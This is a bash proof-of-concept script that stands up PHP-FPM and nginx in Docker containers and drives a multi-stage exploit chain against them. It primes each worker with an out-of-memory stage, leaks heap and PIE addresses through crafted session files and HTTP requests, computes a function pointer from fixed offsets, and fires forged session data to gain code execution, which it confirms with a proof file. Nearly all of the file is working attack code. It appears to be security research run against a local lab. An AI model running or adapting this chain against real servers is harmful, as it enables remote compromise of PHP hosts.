#!/usr/bin/env bash
# Multi-worker chain landing WITHOUT pinning, via the shared-listen rotation.
#
# Stock nginx + a static fpm pool accept a serialized attacker's requests in a
# near-deterministic rotation: one request per worker per cycle. So instead of
# landing all four chain stages on one worker, prime EVERY worker with the OOM
# stage, then send the leak (or fire) stage once per worker. Each stage request
# is then served by a worker that already saw the preceding stage.
#
# This runner uses the HTTP transport (fpm/http_deliver.py) of
# fpm/run_http_full.sh, stock nginx, fpm NOT host-exposed, default
# fastcgi_request_buffering, and no slow-body pinning.
#
# Env: POOL (4), PRE (25500), DCONST (0x193c10), NGINX_PORT (9106),
#      IMAGE (php:8.5.11-fpm), FIRE_REQS (2*POOL), NO_SETUP=1.
set -euo pipefail
HERE=$(cd "$(dirname "$0")" && pwd)
ROOT=$(cd "$HERE/.." && pwd)
FPM_NAME=${FPM_NAME:-p2s-bc-fpm}
NGINX_NAME=${NGINX_NAME:-p2s-bc-nginx}
NGINX_PORT=${NGINX_PORT:-9106}
NET=${NET:-p2s-fpm-net}
IMAGE=${IMAGE:-php:8.5.11-fpm}
NGINX_IMAGE=${NGINX_IMAGE:-nginx:alpine}
INI=${INI:-/usr/local/etc/php/php.ini-production}
EXTRA_INI=${EXTRA_INI:-}
POOL=${POOL:-4}
PRE=${PRE:-25500}
DCONST=${DCONST:-0x193c10}
FIRE_REQS=${FIRE_REQS:-$((POOL * 2))}
NO_SETUP=${NO_SETUP:-0}
A_BASE=111111111111111111111111111111
LB_BASE=222222222222222222222222222222
EB_BASE=333333333333333333333333333333
PROOF=/tmp/fpm5_proof
URL="http://127.0.0.1:$NGINX_PORT"

cat > /tmp/zz-bc.conf <<EOF
[www]
pm = static
pm.max_children = $POOL
pm.max_requests = 0
pm.status_path = /status
clear_env = no
catch_workers_output = yes
access.log = /tmp/fpm-access.log
access.format = "%p %m %r %s"
EOF

if [ "$NO_SETUP" != 1 ]; then
    docker network inspect "$NET" >/dev/null 2>&1 || docker network create "$NET" >/dev/null
    docker rm -f "$FPM_NAME" "$NGINX_NAME" >/dev/null 2>&1 || true
    docker run -d --name "$FPM_NAME" --network "$NET" --network-alias p2s-bc-fpm \
        -v "$ROOT/www:/var/www/html:ro" \
        -v /tmp/zz-bc.conf:/usr/local/etc/php-fpm.d/zz-bc.conf:ro \
        "$IMAGE" php-fpm -F -c "$INI" $EXTRA_INI >/dev/null
    sleep 1.5
    docker run -d --name "$NGINX_NAME" --network "$NET" \
        -p 127.0.0.1:"$NGINX_PORT":80 \
        -v "$HERE/nginx-bc-stock.conf:/etc/nginx/conf.d/default.conf:ro" \
        "$NGINX_IMAGE" >/dev/null
    sleep 1.2
fi

docker port "$FPM_NAME" 2>/dev/null | grep -q . && \
    echo "[warn] fpm has a published port; this test wants it unexposed" >&2 || true
for _ in $(seq 1 50); do
    (exec 3<>"/dev/tcp/127.0.0.1/$NGINX_PORT") 2>/dev/null && { exec 3<&-; break; }
    sleep 0.2
done

printf 'a|i:12345;b|i:12345678901234;c|i:12345678901234;d|i:12345678901234;e|i:123456789012345;' > /tmp/bc_small
docker exec "$FPM_NAME" rm -f "$PROOF"

A_URL="$URL/fpm_sess_split2.php?pre=$PRE&pad=1490900&hole=4096"

send_a() {
    local sid
    printf -v sid '%s%02d' "$A_BASE" "$1"
    docker cp "$HERE/payload/sess_A" "$FPM_NAME:/tmp/sess_$sid" >/dev/null
    docker exec "$FPM_NAME" chown 33:33 "/tmp/sess_$sid"
    curl --max-time 30 -s -o /dev/null -w "%{http_code}" -b "PHPSESSID=$sid" "$A_URL"
}

send_leak() {
    local sid out=$2
    printf -v sid '%s%02d' "$LB_BASE" "$1"
    docker cp /tmp/bc_small "$FPM_NAME:/tmp/sess_$sid" >/dev/null
    docker exec "$FPM_NAME" chown 33:33 "/tmp/sess_$sid"
    QS_IN_BODY=1 python3 -I "$HERE/http_deliver.py" "$URL" "$sid" feffffffffffffff \
        0 0 0 4088 12 /var/www/html/post.php "$out" >/dev/null 2>&1 || true
}

send_fire() {
    local sid out=$2
    printf -v sid '%s%02d' "$EB_BASE" "$1"
    docker cp /tmp/bc_sess_T "$FPM_NAME:/tmp/sess_$sid" >/dev/null
    docker exec "$FPM_NAME" chown 33:33 "/tmp/sess_$sid"
    python3 -I "$HERE/http_deliver.py" "$URL" "$sid" feffffffffffffff "${XPAD:-0}" \
        0 1 0 0 /var/www/html/index.php "$out" 12000 150 8170 /tmp/bc_fill.bin \
        >/dev/null 2>&1 || true
}

echo "[bc] pool=$POOL pre=$PRE dconst=$DCONST url=$URL"

# --- leak cycle: prime every worker, then leak on every worker ---
echo "[bc] leak stage: $POOL primes"
for i in $(seq 1 "$POOL"); do
    printf '  A#%d http=%s\n' "$i" "$(send_a "$i")"
done
echo "[bc] leak stage: $POOL leaks"
LEAKS=""
FIRST_HEAP=""; FIRST_PIE=""
for i in $(seq 1 "$POOL"); do
    send_leak "$i" "/tmp/bc_leak_$i.bin"
    heap=""; pie=""
    if [ -s "/tmp/bc_leak_$i.bin" ]; then
        read -r heap pie < <(python3 - "$i" <<'PY'
import struct, sys
i = sys.argv[1]
d = open('/tmp/bc_leak_%s.bin' % i, 'rb').read()
raw = None
for ln in d.split(b'\n'):
    if b':' in ln:
        k, _, v = ln.partition(b':')
        if len(v) // 2 == 12345:
            raw = bytes.fromhex(v.decode())
            break
if raw is None or len(raw) < 0x3010:
    sys.exit(1)
heap = struct.unpack_from('<Q', raw, 0x98)[0]
pie = struct.unpack_from('<Q', raw, 0x3008)[0]
if not (0x100000000000 < heap < 0x800000000000):
    sys.exit(1)
if pie <= 0x100000000000 or (pie & 0xfff) != 0x777:
    sys.exit(1)
print('%#x %#x' % (heap, pie))
PY
        ) || true
        if [ -n "${heap:-}" ] && [ -n "${pie:-}" ]; then
            echo "  B#$i leak heap=$heap pie=$pie"
            LEAKS="$LEAKS $i:$heap:$pie"
            if [ -z "$FIRST_HEAP" ]; then FIRST_HEAP=$heap; FIRST_PIE=$pie; fi
        else
            echo "  B#$i no valid leak"
        fi
    else
        echo "  B#$i empty response"
    fi
done

if [ -z "$FIRST_HEAP" ]; then
    echo "[bc] FAILED: no worker produced a leak"
    exit 2
fi
HEAP=$FIRST_HEAP
PIE=$FIRST_PIE
D=$((HEAP + DCONST)); BASE=$((PIE - 0x7c9777)); ZIF=$((BASE + 0x60e3a0))
printf '[bc] using heap=%#x pie=%#x d=%#x zif=%#x\n' "$HEAP" "$PIE" "$D" "$ZIF"

printf 'p1|i:1;p2|i:1;p3|i:1;p4|i:%d;p5|i:%d;p6|i:%d;p7|i:16;p8|i:%s;' \
    $((D + 0x38)) $((D + 0xA00)) $((D + 0xE80)) "$ZIF" > /tmp/bc_sess_T
python3 "$HERE/mk_native_fill.py" --d "$D" --heap "$HEAP" \
    --infile "$HERE/payload/fillU.bin" --out /tmp/bc_fill.bin --nogdb >/dev/null
# --- fire cycle: prime every worker again, then fire on every worker ---
echo "[bc] fire stage: $POOL primes"
for i in $(seq 1 "$POOL"); do
    printf '  A#%d http=%s\n' "$i" "$(send_a "$i")"
done
echo "[bc] fire stage: $FIRE_REQS fires"
for i in $(seq 1 "$FIRE_REQS"); do
    send_fire "$i" "/tmp/bc_fire_$i.bin"
    sleep 0.05
    if docker exec "$FPM_NAME" test -s "$PROOF"; then
        echo "  B#$i proof written"
        break
    fi
done
sleep 0.3

if docker cp "$FPM_NAME:$PROOF" /tmp/bc_proof.out >/dev/null 2>&1; then
    echo "[bc] PROOF (stock nginx, fpm unexposed, pool=$POOL, no pinning):"
    cat /tmp/bc_proof.out
else
    echo "[bc] no proof" >&2
    echo "[bc] fpm access log tail:" >&2
    docker exec "$FPM_NAME" sh -c 'tail -n 60 /tmp/fpm-access.log' >&2 || true
    exit 1
fi
